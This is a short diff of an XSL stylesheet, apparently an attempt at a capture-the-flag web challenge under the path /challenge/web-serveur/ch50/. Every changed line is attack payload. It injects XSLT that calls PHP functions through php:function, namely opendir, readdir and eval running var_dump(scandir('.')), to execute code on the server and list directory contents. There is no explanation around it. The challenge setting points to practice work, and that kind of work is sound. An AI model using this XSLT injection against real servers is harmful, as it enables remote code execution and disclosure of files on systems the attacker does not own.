@@ -3,11 +3,14 @@
 <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
 <xsl:value-of select="php:function('opendir', '/challenge/web-serveur/ch50/')"/>
 <xsl:value-of select="php:function('readdir')"/>  
-
+<xsl:value-of select="php:function('readdir')"/>
+  <xsl:value-of select="php:function('readdir')"/>
+  <xsl:value-of select="php:function('readdir')"/>
+  <xsl:value-of select="php:function('readdir')"/>  
 <xsl:variable name="eval">
-        eval("var_dump(scandir('.'));")
+        "var_dump(scandir('.'));"
 </xsl:variable>
-  <xsl:value-of select="php:function('eval','var_dump(scandir('.'));')"/> 
+  <xsl:value-of select="php:function('eval',$eval)"/> 
 
   
   
